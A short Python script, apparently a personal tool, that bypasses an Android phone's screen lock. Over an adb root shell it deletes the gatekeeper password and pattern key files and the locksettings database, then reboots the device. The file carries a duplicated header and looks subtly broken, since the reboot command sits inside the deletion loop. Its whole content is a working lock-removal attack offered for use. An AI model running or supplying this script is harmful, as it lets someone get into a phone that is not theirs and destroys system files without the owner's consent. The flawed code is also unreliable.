#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/4/27 8:45 AM
# @Author  : Steven
# @Contact : 523348709@qq.com
# @Site    : 
# @File    : lockwipe.py
# @Software: PyCharm
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/4/26 4:23 PM
# @Author  : Steven
# @Contact : 523348709@qq.com
# @Site    :
# @File    : wifidog.py
# @Software: PyCharm
import commands
class Lockwipe():
    def __init__(self):
        self.command_list=[
            'adb shell "su -c \'rm /data/system/gatekeeper.password.key\'"',
            'adb shell "su -c \'rm /data/system/gatekeeper.pattern.key\'"',
            'adb shell "su -c \'rm /data/system/locksettings.db-wal\'"',
            'adb shell "su -c \'rm /data/system/locksettings.db\'"',
            'adb shell "su -c \'rm /data/system/locksettings.db-shm\'"'
        ]

    def detect_devices(self):
        cmd='adb shell ls'
        result = commands.getoutput(cmd)
        if len(result)<50:
            return False
        else:
            return True

    def unlook_devices(self):
        for cmd in self.command_list:
            commands.getoutput(cmd)
            commands.getoutput('adb reboot')




